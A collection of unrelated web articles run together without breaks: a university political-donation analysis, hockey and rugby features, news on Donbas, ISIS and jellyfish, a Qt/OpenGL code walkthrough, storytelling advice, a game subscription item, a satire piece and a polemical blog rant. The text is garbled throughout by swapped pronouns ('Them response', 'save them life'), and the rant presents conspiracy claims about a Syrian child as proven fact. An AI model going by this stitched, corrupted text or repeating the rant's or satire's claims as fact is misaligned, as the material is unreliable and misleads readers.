Again, Stanford leads this metric, with 889 unique donors. Princeton has the fewest donors, with 310. However, this is somewhat expected, as Princeton has a dramatically smaller staff than Stanford. It's also important to note that this only includes donors who specified their employer.
The FEC also gives data regarding which candidates individuals are donating to. Figure 4 shows the amount of money given to Clinton and to Sanders during the primary season. This analysis defines the primary season to end June 6, 2016, as that was when major news outlets officially declared Clinton as the winner of the primary. Figure 4 below shows the money given to each candidate between March 1, 2015 and June 6, 2016.
Figure 4: Democratic Primary: Total $ Donated for Clinton vs. Sanders
The first trend that becomes immediately clear is that Clinton received much more support across the board than Sanders. Total donations by school to Clinton ranged from $44,440 at Duke to $308,857 at Stanford. Donations to Sanders ranged from $19,610 at Princeton to $61,949 at Columbia. In fact, with the exception of Duke, staff at every school gave more money to Clinton than even Columbia gave to Sanders.
Figure 5 shows the Hillary Clinton vs. Bernie Sanders trend more clearly. The graph shows the ratio of money given to Clinton vs. money given to Sanders. So, for example, a value of five means that Clinton received five times more money than Sanders during the primary. This helps to isolate which schools are relatively more pro-Clinton or pro-Sanders while removing for total size of donations.
Figure 5: Democratic Primary: Ratio of $ Donated for Clinton to $ Donated for Sanders
Duke was the most Sanders-favoring school. For every $1 given to Sanders in the primaries, $1.73 was given to Clinton. On the other side, Stanford and Yale were roughly the most Clinton-favoring schools. For every $1 given to Sanders in the primaries, Clinton received almost $5.15. UChicago is the second-most Sanders-favoring school, but even UChicago is considerably more Clinton favoring than Sanders. For every $1 given to Sanders at UChicago, $2.12 were given to Clinton.
Figure 6 does this same comparison for the Republican primaries. The Maroon only looked at the three final candidates: Donald Trump, Ted Cruz, and John Kasich. For consistency, The Maroon looked at donations made until June 6, 2016.
Figure 6: GOP Primary: Total $ Donated for Trump vs. Cruz vs. Kasich
The first thing that should be appreciated here is the scale. Values here are roughly two orders of magnitude lower than in the previous graph; these schools donated about 100 times more money to Clinton and Sanders than they did to Trump, Kasich, and Cruz. Part of this can be attributed to there being many Republican candidates, so money is split among different candidates. Additionally, people could have been waiting until the general election to give money to a candidate, as the Republican race was more uncertain than the Democratic race. However, this likely doesn't account for the drastic difference between the Democratic candidates and the Republican candidates.
The next thing we see is that Trump received very few donations. At Duke, Harvard, Princeton, Stanford, and UChicago, Trump received no donations in the primaries. The next thing we see is that some schools were much more active in the Republican primaries. Northwestern, Princeton, Stanford, and UChicago gave substantially more to candidates in the Republican primaries than the other schools did.
Figure 7 looks at money donated in the general election. Specifically, The Maroon looked at money given to Hillary Clinton and Donald Trump between June 6, 2016 and the present.
Figure 7: General Election: Total $ Donated for Clinton vs. Trump
If it looks like Trump is left out of the graph, he's not. The values are just that much smaller than Clinton's. The school with the most donations to Trump is Harvard, with $7,662. However, even this is 60 times smaller than the amount of money donated to Clinton in the general election. At Stanford, over half a million dollars— $580,569 to be exact— were given to Clinton in the general election. This is over 500 times more than what Stanford employees donated to Trump. For comparison, the Clinton campaign has raised $1.3 billion as of October 19, while the Trump campaign raised $795 million, according to the The Washington Post. The donations made by employees at these eight Universities reflect 0.3% of the total donations received by Clinton but only 0.003% of the total donations received by Trump. By any reasonable metric, employees at the University and its peer institutions have donated to Democratic candidates remarkably more than they did to Republican candidates.
“All the Marlies are with the Leafs.”
You've probably heard some Leafs fans joke about that. Actually I'm probably guilty of that myself. The truth, however, is that the Toronto Marlies are still playing games while the likes of William Nylander and Co. are up with the Toronto Maple Leafs.
The Marlies even beat the St. John's Ice Caps, the Montreal Canadiens' AHL affiliate featuring John Scott, this past weekend.
In that game, one of the Marlies did this:
That's Colin Smith, by the way.
Who's Colin Smith? I'm glad you asked.
Amidst this whole rebuild thing, it's easy for even the most hardcore Leafs fans to lose track of who's even a Leaf anymore.
Colin Smith was not the only prospect the Leafs acquired at this year's trade deadline. In fact, they aren't even the only Smith the Leafs acquired. You might even be racking your brain to figure out which trade the Leafs even got them in.
The answer, by the way, is the Shawn Matthias trade with the Colorado Avalanche. The Leafs received Colin Smith in exchange, as well as Colorado's 2016 fourth-round pick.
The way he's playing right now, he's making themselves hard to miss.
Smith has 14 points in 14 games since joining the Marlies, including that goal against the Ice Caps.
I just had to ask Marlies head coach Sheldon Keefe about their new point-per-game player.
“Colin has got a lot of energy, a lot of passion for the game,” Keefe said. “He's versatile in that they can play both centre and wing and can play power-play and penalty kill. That's been handy for us given the way our roster has been. He's a guy that needs to continue to get stronger.”
Coaches always want their players to get stronger, but those kinds of words are brought up most when talking about the smaller guys. At 5-foot-10 and just 178 pounds, Smith isn't exactly the biggest prospect in the Leafs' system. In a game measured in goals, assists, wins and losses however, Smith's numbers stand tall.
“He's never had a problem putting up points in junior hockey and he's had really good stints at different times in the American Hockey League. I know they went through a pretty solid slump before the trade coming here but early in the season they were at a point-a-game pace there, and he's been able to get back to that playing here.”
That slump Keefe refers to was a big one. Smith, 22, was a key offensive cog for the Avalanche's AHL farm team, the San Antonio Rampage, putting up 34 points in 46 games through January. February brought a 10-game pointless drought, spanning their final eight games with the Rampage and first two with the Marlies.
That all changed on Feb. 27. Colin Smith's third game with the Marlies saw them notch two goals and two assists for four points in a monstrous 10-5 Marlies win over the Rochester Americans. From that moment until now, Smith has yet to look back.
For a player who has such flashy moves on the ice, Smith is actually pretty soft-spoken. They talked a bit about the hectic day they had when they got traded. After playing a game in Cleveland, the team flew to L.A. then bussed to their next stop in Bakersfield to play the Condors. After that, Smith found out they had been traded to Toronto so they took a cab to the airport and went to San Antonio.
One of those “So you want to be a professional hockey player?” moments.
“It obviously comes as a shock,” Smith said of being traded. “I just took it in stride and moved forward. And then when I got here it was a great opportunity with a great team, great organization. I was really grateful and thankful for the opportunity to start my career [in San Antonio] but to come here and get a new start, I just see it as a great opportunity.”
What has the Edmonton native liked most since the trade?
“I think the one thing is just being back in Canada as a Canadian, obviously. Toronto is one of the top markets in the world for hockey. To come here, just the excitement around, the buzz around the city, how they get behind the Marlies for this playoff run, it's pretty exciting and I'm happy to be here.”
Where Smith ultimately fits in the Marlies' lineup is still up in the air with so many of their teammates up with the Leafs. Keefe has used Smith primarily at centre and has complimented their face-off skills, as well as their play in the defensive zone. Whether Smith stays at centre when all eligible Leafs join the Marlies for their playoff run is still a mystery.
Speaking of the NHL, will it be Colin Smith's turn next?
“Nah, I haven't heard anything,” they said. “I've just been trying to play. I just see it as a great opportunity to be here, that's why I've been trying to get better and play solid and, you know, whatever happens, happens.”
A man of few words and many points — which I imagine suits the Marlies just fine.
Ukrainian official: Russia continues pouring weapons and personnel to Donbas Wednesday, August 9, 2017 5:00:49 PM
Russia sent 104 trains and 53 convoys of military and motor vehicles to Donbas since the beginning of 2017. This was stated in the materials published by Yevhen Marchuk, the representative of Ukraine in one of the subgroups in the Tripartite Contact Group for the Settlement of the Situation in the Donbas.
"When I hear the Russian propagandists writhing in hysteria over the possible transfer of defensive weapons to Ukraine by the United States and how it is sung by some of our so-called "experts," I submit a small fragment from the official materials that the Ukrainian side promulgates each time during the meetings of the working group on security issues in Minsk. This information is heard not only by the Russians but also by the coordinator of the work of our group from the OSCE in English translation.  They are also the head of the OSCE SMM on Ukraine," Marchuk wrote on Facebook.
In July alone, illegal armed groups of Donbas received from Russia 4 tanks, 7 armored combat vehicles, 4 artillery systems, 7 missile artillery units, up to 8 motor vehicles, 103 tanks and 4 tank trucks with fuel, 19 railroad cars, and 10 freight vehicles of ammunition.
Within that same month, 44 cases of using unmanned aerial vehicles for reconnaissance of the territory of Ukraine and 4 cases of using reconnaissance aircraft of the Russian Air Force were recorded.
Marchuk added that Russia denies these facts.

This blog post presents a short example program that illustrates how to use OpenGL and Qt in a scene graph. The two main goals are to show how the scene graph can be used, and more importantly, how to incorporate your own OpenGL code as part of the scene graph (as opposed to overlaying them).
The code is relatively short and commented so rather than describe it here in detail, I suggest you build and run it, and then study the code, possibly making some changes of your own. The complete source code can be downloaded from here.
The example will build with recent versions of Qt 5 on platforms that have OpenGL. When run you should see a window, which will show an image that alternates every couple of seconds.
Here is a brief overview of each of the source files:
The file classes.h defines some useful classes that are used in the implementation:
DynamicTexture, derived from QSGDynamicTexture
Textures, a simple struct that is used in conjunction with YUVMaterial to generate boilerplate code
YUVMaterial, a Material class, it can be thought of as how your scene object appears visually. It can be simple colors, textures, or even be more dynamic in terms of appearance. It has a vertex shader and a fragment shader.
TextureNode, a Geometry node that describes the shape of the geometry
The file classes.cpp has the implementation of these classes and their methods. All of the methods are quite short, the longest being DynamicTexture::updateTexture().
In the file myqmlitem.h, the new class MyQMLItem is declared derived from QQuickItem. It has a standard constructor and destructor. There is a property of type QString for the filename with getter, setter/slot, and signal methods. Finally, a method updatePaintNode is declared, which is called whenever the Scene Graph is updated or when QQuickItem::update() has been called.
In myqmlitem.cpp we have the implementation of the methods for the MyQMLItem class. The only non-trivial method is the implementation of updatePaintNode(). See the comments in the code for more details.
The file main.cpp creates a QGuiApplication, as required by Qt's event system and a QQuickView to contain the Qt Quick view. It registers the type MyQMLitem so that it can be used from QML, and sets the main QML source file to main.qml. Finally, it shows the view and calls the Qt event loop.
The QML file main.qml simply creates a top level Rectangle of a suitable size and color. Contained with it is a MyQMLItem with an image file name. A timer alternates between two different images every two seconds be setting the appropriate property.
If you need to use OpenGL and a scene graph with Qt, I hope you find this example helpful as a starting point for your own code.
In the confirmation hearing for Education nominee Betsy DeVos, Democratic Senators pressed for specific answers on numerous crucial questions. And Senator Bob Casey (D-PA) hit on an area where DeVos seemed woefully unprepared for a meaningful discussion: Title IX protections for victims of sexual assault in colleges and universities.
Secretary of Education nominee Betsy DeVos forgot to study for the biggest test of their life. With Senator Bob Casey (D-PA) on the education committee — who, along with fellow Senator Patty Murray (D-WA), is one of the main sponsors of the Campus SaVE Act, which helped write stricter standards for colleges and universities dealing with sexual assault — DeVos should have been prepared to discuss the issues around campus sexual assault.
But when Casey asked DeVos pointedly and directly whether or not they would support the current provisions and standards of evidence as stated by that law, their response was a waffling non-answer about working with “the range of opinions” on the topic. When pressed, they commented that it would be “premature” of them to say whether or not they would commit to the current federal guidance on the subject.
Them response was so lacking in understanding and specificity that Casey then explained to them the context surrounding the law, what the current standards are, and, most importantly, why they were asking this question: They have donated to a group that supports laws which are in opposition to the current federal stance on Title IX and campus sexual assault.
CASEY: Let me give you a little background here that you might know: In 2011 the Department of Education issued guidance on Title IX, by this administration, by the current administration. Would you uphold the 2011 Title IX guidance as it relates to sexual assault on campus?
DEVOS: Senator, I know that there's a lot of, uh, conflicting ideas and opinions around that guidance. And if confirmed, I look forward to working with you and your colleagues and understand the range of opinions and understand the issues from the higher ed institutions that are charged with resolving these and addressing them, and I would look forward to working together to find some resolutions.
CASEY: Well, I agree with the guidance, so I'm just asking for a yes or no. I guess you're not going to give me a yes or no answer on committing to that guidance.
DEVOS: That would be premature of me to say.
CASEY: This problem, to say it's an epidemic would be an understatement. The Centers for Disease Control told us back in 2009 that 1 in 5 women are the victims of sexual assault on campus. A lot of those 1 in 5 never have an opportunity or never report incidents. It's a major problem for women. In so many ways, it's the ultimate betrayal. Parents for generations have told their daughters: study hard in school, get good grades, because when you get good grades, you might have the opportunity to go to college. And when you get to college, the world is open to you. And you can succeed by having higher education.
But too often, it happens every year on many campuses around the country, too often, a young woman is a victim. Sometimes on the first day she's there, in the first week. Sometimes over the course of their first year, and their life is destroyed by that. So, we have a long way to go to addressing this problem. We took some good action on this issue on the Violence Against Women Act. It just happened to be my bill that got passed into law, the so-called Campus SaVE Act.
What we did in that bill was for the first time say to colleges and universities: You have to do more than you're doing. Certainly on one broad topic of prevention and on awareness. So young men on the campus who are the perpetrators of this have to be part of the solution. They have to be part of bystander education, a preventative strategy. But in addition to all kinds of transparency and requirement, this is what the act did for women, or for victims I should say, or victims of assault.
Colleges and universities must provide clear statements regarding the procedures followed, they must do more than they had been doing when it comes to enforcement, and in particular with regard to victims it says the college or university must indicate to the victim their right to notify law enforcement, the institution has an obligation to help the victim report to law enforcement, including helping them get a protective order. So that's what the law is now. My bill. The fall of 2015 this went into effect across the country.
There's an organization called the Foundation for Individual Rights in Education, they support a bill that would totally change that: They would force a victim to go to the police to report, and they would change the standard evidence.
Would you commit as Secretary of Education to retaining the standard of evidence that is currently the law?
DEVOS: Senator, let me just say that my mom's heart is really piqued on this issue. Assault in any form is never okay and I just wanna be very clear on that. If confirmed I look forward to understanding the past actions and the current situation better and ensuring that the intent of the law is carried out in a way that recognizes both the victim – the rights of the victims, and as well as those who are accused as well.
CASEY: I'm out of time. The organization that has that position, which is contrary to the law, the current law, and contrary to the spirit of what we try to do in that piece of legislation, is the recipient of donations from you totally about twenty five thousand bucks over the course of four years. And I would hope that's not a conflict of interest.

Defense Secretary Ashton Carter said Tuesday that the U.S. will begin “direct action on the ground” against ISIS forces in Iraq and Syria, aiming to intensify pressure on the militants as progress against them remains elusive.
“We won't hold back from supporting capable partners in opportunistic attacks against ISIL, or conducting such missions directly whether by strikes from the air or direct action on the ground," Carter said in testimony before the Senate Armed Services committee, using an alternative name for the militant group.
Carter pointed to last week's rescue operation with Kurdish forces in northern Iraq to free hostages held by ISIS.

Carter and Pentagon officials initially refused to characterize the rescue operation as U.S. boots on the ground. However, Carter said last week that the military expects "more raids of this kind" and that the rescue mission "represents a continuation of our advise and assist mission."
This may mean some American soldiers "will be in harm's way, no question about it," Carter said last week.
After months of denying that U.S. troops would be in any combat role in Iraq, Carter late last week in a response to a question posed by NBC News, also acknowledged that the situation U.S. soldiers found themselves in during the raid in Hawija was combat.
"This is combat and things are complicated," Carter said.
During Tuesday's Senate hearing, Carter said Wheeler "was killed in combat."
White House deputy press secretary Eric Schultz on Tuesday said the administration has "no intention of long term ground combat". They added that U.S. forces will continue to robustly train, advise and assist.
A feisty Sen. Lindsey Graham, R-South Carolina, said on Tuesday in the Senate Armed Services committee hearing that the U.S. effort in Syria is a "half-assed strategy at best," and said that the U.S. is not doing a "damn thing" to bring down Syrian President Bashar Assad's regime.
Carter on Tuesday pushed back against that notion.
Gen. Joseph Dunford, chairperson of the Joint Chiefs of Staff, acknowledged that the "balance of forces" has tilted in Assad's favor.
Irukandji jellyfish on the move down Queensland's coast, expert says; four people stung off Fraser Island
Updated
Marine experts have reinforced warnings that deadly Irukandji jellyfish are moving south and could soon be on Queensland's popular Sunshine Coast beaches.
It comes after four people were hospitalised on Wednesday and Thursday from Irukandji jellyfish stings on the western side of Fraser Island.
RACQ LifeFlight Rescue said the three women and a 12-year-old girl were all in stable conditions in Hervey Bay Hospital.
But James Cook University Associate Professor Jamie Seymour says it shows how the Irukandji's migration south needs to be taken more seriously.
"What we need to do is get a better understanding of the biology of the animal. We've got good data now that shows quite nicely that Irukandji have been spreading down the east coast of Australia, moving slowly but surely southwards," Associate Professor Seymour said.
"The length of the season has increased from one to two months to almost six months.
"And it's only a matter of time before they get from southern end of Fraser Island to the Sunshine Coast and that's when things will get interesting."
Associate Professor Seymour, who is also a specialist in Irukandji with the Australian Institute of Tropical Health and Medicine in Cairns, said the move south to Fraser Island, which they have confirmed with sampling, was corresponding to the rising sea temperatures.
"We've seen a 1- to 2-degree temperature rise in the water off the coast in the southern side here and the animals have moved predictably with that," they said.
They predict beaches in south-east Queensland will suffer from closures as a result of increasing rates of stings in the coming years.
Associate Professor Seymour said there had been two confirmed deaths from Irukandji in recent history in Australia, but dozens of people are hospitalised from Irukandji syndrome every year.
They have been stung more than 10 times by the notorious jellyfish, which grows no larger than a thumbnail.
They said the pain was overwhelming.
"This is a 10 out of 10 pain that you are going to hang onto for probably six to 12 hours," Associate Professor Seymour said.
"There's usually severe vomiting, nausea, stomach cramps and about 10 to 15 per cent of patients ends up with cardiac problems.
"Linked with that is this feeling of impending doom where everything is going to go wrong and there's nothing you can do to fix it."
We need to assess what is going on: tourism body
Queensland Tourism Industry Council chief executive Daniel Gschwind said there was no need to panic about the recent incidents on Fraser Island.
"Sometimes the evidence has to be assessed properly. Because we can't conclude the Irukandji is moving further south just because of a few incidences," they said.
"Sometimes it may just be a seasonal thing, it may be something that has always happened but not caused any harm before.
"I think we need to assess what is going on before we unnecessarily harm people."
But Mr Gschwind said tourism operators would be well informed in the region and they agreed more research was needed into the Irukandji.
"But it's not up to tourism body to fund that research, it's up to governments generally and many research funding opportunities are there are for medical research and scientific research," they said.

If you want a real-world example of that cognitive blind spot where a person is too incompetent at something to know better (aka the Dunning-Kruger effect), look to your group of friends and family. Which one among them can't tell a good story to save them life? There's your Dunning-Kruger; the reason she's terrible at stories is because they have no idea she's terrible at stories.
Of course, if none of your friends is terrible at storytelling, then you know what that probably means. But either way, it's likely there is someone in your life (maybe you) who hasn't mastered the art of entertaining others with a story.
It's the chucklehead whose PowerPoint presentation seems to last 6 hours instead of 6 minutes. It's the wedding guest who brings the reception to an awkward standstill. It's your dad on the phone.
There are plenty of books available that will try to teach you how to tell a good story, but save your money. If all you want to do is make your stories less painful to sit through, you just have to break a few bad habits and keep in mind a handful of simple rules.
So whether you need to forward this to a friend (or parent), or read it by yourself in secret shame, here are some guidelines on how to avoid telling a disastrous story.
PART I - THE BASICS
Or, how to make your stories not terrible, at least
Keep it short.
Nobody likes to sit through a long story. Nobody needs to sit through a long story. If you can't tell it in less than 3 or 4 minutes, and you're not the narrator of "The Princess Bride," then you're probably telling too much story. Find the main narrative arc—the setup, the conflict, and then the resolution—and save everything else for future stories.
Don't get hung up on details.
One of the most common traps of storytelling is the dreaded "forgotten detail"―the name that you can't quite recall, or the exact phrasing of one of the participants. Never interrupt the story with something like, "What was their name again?" Your listener shouldn't have to answer questions before they can hear the entire story.
Tell one story at a time; NEVER link or nest stories.
Some people think storytelling should be the verbal equivalent of Katamari Damacy, where you grab your suffering listener in a bear hug and roll all over creation accreting random junk.
This is the single worst rookie mistake you can make, and because humans are too polite, nobody will tell you that you are a horrible person for taking them down a cascading wreck of half-stories for 45 minutes.Remember: We are not trapped in an inception. Your story is not part of the Arabian Nights. You are not Sally Menke. Seriously, I cannot stress enough how annoying this habit is. People cringe you when you start to "tell" a "story" because they know they will never hear the end of any one story, but they will hear the beginning of, oh, seventy or eighty.
If you ever hear yourself saying, "Oh that reminds me," in the middle of your story, just stop talking immediately. The only thing it should remind you of is that you are a bad storyteller.
Never wait for a reaction.
You might be tempted, if you have a story that you think is particularly strong, to pause at the important parts and wait for the anticipated verbal response from your listener. Don't do this. Even if you know in your heart that your next sentence deserves a shocked "oh no you didn't!", you should tell your story as if you aren't aware of this. Listeners can pick up on it when you anticipate their reactions, and then they'll become self-conscious and freeze up.
Tell your story in one go.
Your story is not an HBO series.
Make sure your story has a good ending.
If you're going to make your listener sit through an entire story, you'd better have a good reason why by the end of it. Careless storytellers will sometimes start to tell a story because they think it has an interesting beginning, but they won't take a moment to visualize how they plan to end it. This can lead to hurt feelings all around.
Here's a recent example from my own life that will illustrate the pitfall of the weak ending:
Start of story (addressed to office mates): "Yesterday when I left here I was so wound up, and I saw that bar across the street and thought about how delicious a beer would taste."
End of story (a few seconds later): "But then I just went home."
I actually told that story, and now the people in my office don't like me anymore. [This is true. -Editor]
Here are some go-to endings that are proven winners with listeners. Try to work them into your stories.
A comeuppance - You learn the hard way why you shouldn't have done x.
A twist - The story is heading towards ending x, but then you explain why it's really all about y.
A lesson learned (aka an epiphany) - You have a profound realization that will impress the listener.
Note that if you're preparing a story for a business audience, you can reframe both the comeuppance and the lesson learned as "customer insights," and you will be praised for your innovative synergy of the quarterly monetization.
PART II - ADVANCED TECHNIQUES
Or, training for The Moth
If you can master the techniques above, you'll be able to tell a halfway decent story in almost any situation. But if you master the techniques below, you'll be able to captivate an audience the way a hungry cobra hypnotizes a shoebox full of mice.
Watch your listener and adjust your story accordingly.
Some listeners will pay rapt attention to you and ask for more and more story. They are ravenous. Others will settle in with a sort of "oh boy" sigh at the very start, and watch you through half-lidded eyes. Adjust the length of your story based on the type of person listening to you.
Maintain velocity.
Good storytelling is a sort of verbal bobsledding. A good story need not be brief, and it also doesn't have to be told at a breakneck pace. But it should move briskly and have a lot of energy behind it, and maybe feel a bit reckless at certain points.
Stick with comedy unless you're a professional or an inspirational speaker.
(And actually, the best inspirational speakers tend to use comedy, too.) In most areas of life, comedy is harder to pull off than drama. But when it comes to casual storytelling, you'll find that most people want to laugh and will try their damnedest to have a good time with you.
EXTRA PRO-LEVEL TIPS
Finally, here are some optional techniques that can help you turn a "ha ha, that's cute" story into a "wtf? that's awesome!" story.
Never describe your dreams unless they meet the following conditions:
The dream can be told in less than ten seconds, and One of the following elements is part of the dream:
sex with a celebrity
cannibalism
Don't tell dad stories (or mom stories).
In my family this means don't just repeat the story a second time in an attempt to get a stronger reaction from your despondent listeners. In other families it may mean you shouldn't use catch-phrases over and over, or it may mean you need to stop bringing everything back to the topic of grandchildren and why you hunger for them so. The only thing your story needs to do well is entertain the listener. If it's not doing that, find a better story. And tell it better.
Avoid the topic of death in most situations.
Don't tell stories that involve death unless you can make them (a) cartoonishly shocking or (b) so bizarre that they cease to feel realistic.For example, I have a story about a dead cat. I don't tell that story, because it grosses people out and makes them sad. But I have another story about a birthday pony who died because of a sweet elderly couple, and that story I do tell, because it's so outrageous that people forget all about the death part and just marvel at the rampant absurdity.
Don't Kanye your story.
Never make yourself the hero of the story. First of all, it's probably untrue, and second of all, nobody likes to hear all about someone else's happiness. You can't root for a character if their life is already perfect.
Don't repeat yourself (if you're called out on it).
If your listener says something like "You've told me this" or "Oh I read about that" then immediately stop telling the story. Your inclination will be to go ahead and rush through the rest of the story anyway, as if your listener still needs to be reminded of what it was about. But they don't, because they already told you that they remembered it.
Do share things that are inappropriate―but not offensive!
An easy way to spice up a story (while also protecting yourself from the Kanye trap) is to overwhelm the listener with unexpected details that no normal human being would consider sharing publicly. These details can include: public arrests, disastrous first dates, and overactive neuroses. Read older David Sedaris pieces for perfect examples of inappropriate details.
So at your next book club party / meeting with your parole officer / blind date, try out these storytelling tips and enjoy the social rewards.

Last week, SOE announced a change to PlanetSide 2 Premium subscriptions, revealing that by Feburary, the 500SC per month bonus given to members would be scrapped in favour of a new system, where every member would be given the opportunity to select an item worth up to 2000SC. Reactions were mixed, so CEO John Smedley took to Reddit to clarify a few things, particularly why SOE decided to go down this route.
“The goals of our plan are very simple,” Said Smedley. “Let players buy anything they want up to 2000 SC. It's fair to say that there aren't a lot of high priced items in the Planetside 2 shop, but that's kind of a good thing too. It's just when you look at it from the perspective of someone who's plan is changing they are right to ask ‘why is this good for me?'.”
One of the concerns raised in the forums when this was first announced was the impact this would have on Player Studio items, and Smedley admits that SOE didn't think that through and is reevaluating that aspect.
“Why did we make this change?” Smedley continued. “There were a few reasons really. First and foremost we wanted to let players get some of the larger items on the marketplace. People complain the other way on this all the time – they complain that the 500SC isn't enough for them to buy enough stuff. So we thought this would be a positive change.
Another reason for this new system being implemented was the issue of Station Cash just accruing in people's wallets, not being spent. “There are a lot of people who play and have SC in their wallets and don't spend it ever.. this accrues over time and it's a problem. Before the jaded among you cry out that this is really the most important reason – please don't judge just yet. It's actually not but I don't want to hide the fact that it's a part of it.”
SOE also wants to end the disparity between its console titles, where Station Cash cannot be used, and its PC titles, where it can be. “We can't do the same kind of promotions as easily on the PS3 and PS4. We're a lot more limited because we can't use Station Cash on there. So when we have a 3x sale on SC we have to do something different for our console titles. It's a pain in the neck to deal with this.”
Then Smedley dropped the bombshell that there would soon be a $14.99 subscription that would cover all SOE titles, from Everquest Next to PlanetSide 2. “That's a benefit most companies simply can't offer because they don't have our portfolio of games. The goal would be to let you pick an item in each game you play.”
What do you lovely people think of SOE shaking things up?

BRUSSELS (The Borowitz Report)—A ten-year European plan to gradually phase out American football in the United States and replace it with soccer is “very much on track,” a spokesperson for the European Union confirmed today.
The E.U. spokesperson, Alf-Jergen Holmboe, said the replacement of American football with soccer was the third in a three-step plan to transform the U.S. into a European country.
“The first two steps were electing a socialist President and instituting national health care,” they said. “Once soccer replaces football, our work will be done.”
Holmboe said that the E.U. could take no credit for the legalization of gay marriage in the United States, but called it “a very welcome development.” They added, “Once a country has socialism, national health care, and gay marriage, soccer is usually next.”
The spokesperson offered no timetable for eliminating baseball, but indicated that it was “in the works.”

Oh You've Got To Be Fucking Kidding Me
Caitlin Johnstone Blocked Unblock Follow Oct 6, 2017
Well, we've done it folks. We've hit peak corporate fauxgressivism.
Go home, Hillary's hot sauce. Go home, Chuck Schumer's fake tears for immigrant families. Go home, Bill Maher taking a knee. You've all been blown clean off the pages of establishment liberal vanity politics history forever.
This is always the way it happens. They always do this. You get a cool, real anti-establishment movement happening, and the establishment finds a way to hijack its momentum and divert it toward corporatist oligarchic interests. Important civil rights grievances get used to blackmail vulnerable populations into voting Democrat. Bernie's revolution got warped and twisted into phony establishment “Resistance” cronyism. Now we're seeing it taken to its most obscene extreme in Colin Kaepernick's recent meeting with Bana Alabed, a child who has been used and exploited in blatant acts of war propaganda.
Kaepernick has arguably done more than any other living individual to bring attention to the present-day epidemic of US police brutality in general and to law enforcement's disproportionate violence toward black Americans in particular. Their grievances are legitimate, the movement he's helped lead is very important, and their influence presents a very real obstacle for those who wish to keep expanding the militarization of America's depraved police state. So naturally he's been selected to help publicize the book of a known psy-op whose sole purpose has been to manufacture western support for military interventionism in Syria.
And it's not just Kaepernick. The Malala Fund, the nonprofit girls' education organization founded by Nobel Prize laureate Malala Yousafzai, has been promoting the new Bana Alabed book as well.
This is a standard tactic we're seeing used again and again by these manipulative fucksticks. Humanity's natural impulse toward goodness and harmony gives birth to something beautiful, and the psychopathic elites who have seized control of our world find a way to corrupt it toward their interests. Humanity is constantly striving to wake up from its illusions and begin functioning in a sane way, but these bastards are so adept at the science of social manipulation that they always find a way to divert the momentum of those efforts, aikido-like, toward lulling humanity back to sleep.
This is the entire purpose of the Democratic party right now, while we're on the subject. The so-called “two-party system” is really just one corporate party with two different functions: the Republican party which blatantly advances plutocratic interests, and the Democratic party which hijacks any revolutionary movement against those interests and diverts it back into less obvious establishment loyalism. Any attempt to rally people together to advance the interests of humanity over plutocracy gets instantly infiltrated by Democrats saying “Yes! Absolutely! We're on your side! Let's fight the man together! Just elect this pro-fracking Democratic war hawk with extensive ties to Goldman Sachs so we can help stick up for people like you!”
Bana Alabed is undeniably a deceitful war psy-op which has been advanced by the highest levels of the mainstream media. There is a mountain of irrefutable evidence for this fact, including hard proof that CNN knowingly staged a fake, scripted interview with a little girl who can't speak English for the purpose of selling an anti-Assad, pro-interventionist narrative against Syria to the American people. They presented that fake interview to their audience as real, and CNN's Alisyn Camerota necessarily had the other half of the script they used.
And now we're seeing them paraded around with the likes of Malala and Colin Kaepernick to lend the psy-op the illusion of legitimacy and to pied piper all well-intentioned revolutionary sentiment into support for the US war machine.
Last week, one year after they called Colin Kaepernick “a fucking idiot” for criticizing Hillary Clinton, sleazy plutocratic ball tickler Bill Maher took a knee. They didn't do this in support of the African American community, and they didn't do it to protest police brutality. They did it because the Republican president had recently made some asinine tweets, and they wanted to rally Democrats in opposition. The establishment manipulation — the exact variety we're discussing in this article — could not have been more blatant.
Bill should have little Bana on their show.

After finishing an emotionally wrenching project on children with leukemia, Rosario Heer wanted to photograph something lighter. A chance meeting with Diego Claisse, a rugby coach, got them to thinking: Wouldn't it be nice to spend time taking pictures of rich kids tussling on the field at one of Buenos Aires's exclusive rugby clubs?
When they asked Mr. Claisse if they could go with them to the club, they agreed. But then they made an offhand comment: they also coached a rugby team composed of convicts.
“I wanted the jail!” Ms. Heer recalled. “I always get attracted to those kinds of stories. Why did they have to say that to me? I knew that if I was photographing the rich kids, I would have been wondering what was going on in the jail.”
So, before they took a single frame, their project went from looking at Argentina's elites to spending five months with felons serving time at the Unidad Penitenciaría de San Martín, on the outskirts of Buenos Aires. The result is “Try,” a peek at the lives of Los Spartanos, men behind bars who find a measure of release, brotherhood and hope playing a rough-and-tumble sport that is more popular on the other side of the world than in soccer-mad Argentina.
Rosario Heer
Ms. Heer arrived at the prison last year with Mr. Claisse and Eduardo Oderigo, a lawyer who founded the club three years ago almost on a do-good impulse. They had no idea what they were getting into, though their first steps into open-air sections of the complex didn't seem so daunting — at first.
“I was a bit paralyzed,” they said. “The first part, I felt free, in a sense. But you start to feel trapped because everyone is looking at you, from the guards to the prisoners. And, I'm claustrophobic. It was not a great combination. Well, who told me to go to jail?”
That first day, they had a chance to present their project to the members of the rugby team, who for the last two years have lived in their own cellblock. The unit attracts those who want to play rugby, as well as prisoners who are sent there for good behavior and wind up helping the team. The cellblock has some comforts absent in other parts of the jail, like a television, video games and table tennis.
They said their proposal to photograph the team was received well, since the men wanted to show a different side of prison life. They knew that because of their crimes, the outside world would judge them as undesirable. But they saw in Ms. Heer a chance to humanize themselves and their situation.
Granted, the fact that they played rugby instead of soccer itself gave them a certain reputation among the other inmates.
“Rugby has a lot of contact, and to outsiders it looks like they are killing each other,” Ms. Heer said. “If you know how to play, it's not as hard as it seems. But from the outside, it looks like they are the rude boys of the jail, so no one gets near them.”
Rosario Heer
Though they wanted to get close to the rugby players, Ms. Heer chose not to ask why they were in prison or even how long they were sentenced. They thought that kind of information would alter how they looked at them, or even scare them If anything, the inmates took pains to be courteous around her, even scolding others who spit or swore.
The team practiced with their coaches, and in front of Ms. Heer, on Tuesday mornings. On Fridays, they practiced without Ms. Heer. Every three months, they played another team, and not always in jail — a judge sometimes allowed them to travel to a match.
The first game Ms. Heer photographed was between Los Spartanos and a team of judges and lawyers. No one on either side recognized one another.
“One of Los Spartanos asked if they let the judges win would they get early release,” they said. “It was a fun game. They were afraid of taking the ball away from the judges or lawyers.”
Games like this one were also opportunities to reconnect with friends and family, moments treasured by the prisoners. And as part of the game ritual, they shared snacks and conversation with their opponents afterward.
“The captain of Los Spartanos said it had been a long time since they felt as free as they had that day,” Ms. Heer said.
